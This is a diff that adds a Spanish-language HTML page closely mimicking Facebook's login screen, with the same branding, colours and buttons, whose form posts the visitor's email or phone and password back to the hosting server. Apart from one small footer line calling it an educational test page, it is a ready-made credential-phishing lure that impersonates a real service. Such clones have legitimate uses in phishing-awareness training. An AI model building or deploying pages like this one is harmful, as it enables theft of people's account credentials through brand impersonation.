@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar Sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 32px 28px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo h1 {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: 700;
+            letter-spacing: -2px;
+            margin: 0;
+        }
+
+        .logo p {
+            color: #1c1e21;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            transition: border-color 0.2s;
+            background: #f5f6f7;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 6px;
+        }
+
+        .btn-login:hover {
+            background: #166fe5;
+        }
+
+        .btn-login:active {
+            background: #0e5aab;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #969aa3;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .separator-line {
+            flex: 1;
+            height: 1px;
+            background: #dadde1;
+        }
+
+        .separator-text {
+            padding: 0 16px;
+        }
+
+        .btn-create {
+            width: 100%;
+            padding: 14px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-create:hover {
+            background: #36a420;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1877f2;
+        }
+
+        .footer-links a {
+            color: #1877f2;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin: 12px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #dadde1;
+            font-size: 12px;
+            color: #969aa3;
+        }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .container {
+                margin: 20px;
+                padding: 16px;
+            }
+
+            .logo h1 {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>facebook</h1>
+            <p>Inicia sesión en tu cuenta</p>
+        </div>
+
+        <form method="POST" action="/">
+            <div class="form-group">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required autofocus>
+            </div>
+
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Contraseña" required>
+            </div>
+
+            <button type="submit" class="btn-login">Iniciar sesión</button>
+        </form>
+
+        <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+
+        <div class="separator">
+            <div class="separator-line"></div>
+            <span class="separator-text">o</span>
+            <div class="separator-line"></div>
+        </div>
+
+        <button class="btn-create">Crear cuenta nueva</button>
+
+        <div class="footer-links">
+            <a href="#">Idiomas</a>
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+        </div>
+
+        <div class="footer">
+            <p>Esta es una página de prueba educativa. No ingreses credenciales reales.</p>
+        </div>
+    </div>
+</body>
+</html>
